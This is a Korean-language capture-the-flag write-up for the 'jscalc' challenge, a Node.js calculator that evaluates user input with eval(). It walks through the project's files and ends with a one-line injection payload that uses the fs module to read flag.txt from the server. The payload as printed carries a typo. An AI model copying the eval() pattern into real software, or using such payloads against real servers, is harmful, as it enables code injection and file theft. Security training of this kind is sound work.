# jscalc
![JavaScript](https://img.shields.io/badge/javascript-%23323330.svg?style=for-the-badge&logo=javascript&logoColor=%23F7DF1E)
![js](https://img.shields.io/badge/Node.js-43853D?style=for-the-badge&logo=node.js&logoColor=white)

![image](https://github.com/user-attachments/assets/ef9e4118-eed8-4707-bbdb-f87dac2556fd)
- 입력한 값을 ```eval()``` 로 계산해주는 사이트

## Tree
```
 > tree /F
 Folder PATH listing for volume system
 Volume serial number is F2DB-00D8
 C:.
 │   build-docker.sh
 │   Dockerfile
 │   flag.txt
 │   supervisord.conf
 │   
├───challenge
 │   │   index.js
 │   │   package-lock.json
 │   │   package.json
 │   │   yarn.lock
 │   │
 │   ├───helpers
 │   │       calculatorHelper.js
 │   │
 │   ├───routes
 │   │       index.js
 │   │
 │   ├───static
 │   │   │   favicon.png
 │   │   │
 │   │   ├───css
 │   │   │       main.css
 │   │   │
 │   │   └───js
 │   │           main.js
 │   │
 │   └───views
 │           index.html
 │
 └───config
 supervisord.conf
```
- 디렉토리 구조는 위와 같다.

## 정적 분석
```
 {
   "name": "jscalc",
   "version": "1.0.0",
   "description": "",
   "main": "index.js",
   "nodeVersion": "v8.12.0",
   "scripts": {
   "start": "node index.js"
   },
   "keywords": [],
   "authors": [
   "makelaris",
   "makelarisjr"
   ],
  "dependencies": {
   "body-parser": "^1.19.0",
   "express": "^4.17.1"
   }
 }
```
- 애플리케이션을 시작하는 데 사용되는 스크립트인 "start"가 ```index.js```를 실행하는 것을 확인

```
const express  = require('express'); 
const app  = express();
const bodyParser  = require('body-parser');
const routes  = require('./routes');
const path  = require('path');

 app.use(bodyParser.json());

 app.set('views', './views');
 app.use('/static', express.static(path.resolve('static')));

 app.use(routes);

 app.all('*', (req, res) => {
 return res.status(404).send({
 message: '404 page not found'
	});
 });

 app.listen(1337, () => console.log('Listening on port 1337'));
```
- ```app.use(routes);```로 라우팅 미들웨어를 등록하여 현재 디렉토리의 'routes; 모듈에서 정의한 라우팅 로직을 사용하는 것을 확인

```
const path = require('path');
const express  = require('express');
const router = express.Router();
const Calculator = require('../helpers/calculatorHelper');

const response = data => ({ message: data });

 router.get('/', (req, res) => {
	return res.sendFile(path.resolve('views/index.html'));
 });

 router.post('/api/calculate', (req, res) => {
	let { formula } = req.body;

	if (formula) {
		result = Calculator.calculate(formula);
		return res.send(response(result));
	}
 return res.send(response('Missing parameters'));
 })
 module.exports = router;
```
- ```./routes/index.js```의 내용이다. ```/api/calculate```로 POST 요청이 들어오면 인자를 ```Calculator.calculate();```에 넣고 반환값을 클라이언트에게 전송한다.

```
module.exports = {
 calculate(formula) {
   try {
     return eval(`(function() { return ${ formula } ;}())`);
   } catch (e) {
       if (e instanceof SyntaxError) {
         return 'Something went wrong!';
       }
     }
   }
 }
```
- ```../helpers/calculatorHelper```의 내용이다. 함수 calculate가 받은 인자를 eval()에 넣어서 실행하고, 반환한다.
- calculatorHelper기준 상위 디렉토리에 있는 flag.txt를 읽는 것이 목표이므로, fs 모듈의 ```readFileSync()```를 사용하여 파일을 읽도록 시도한다.

## PoC
```requier('fs').readFileSync('../flag.txt', 'utf8')```

![image](https://github.com/user-attachments/assets/5409cb6c-caea-4872-ba82-7c92c6b9fcd7)



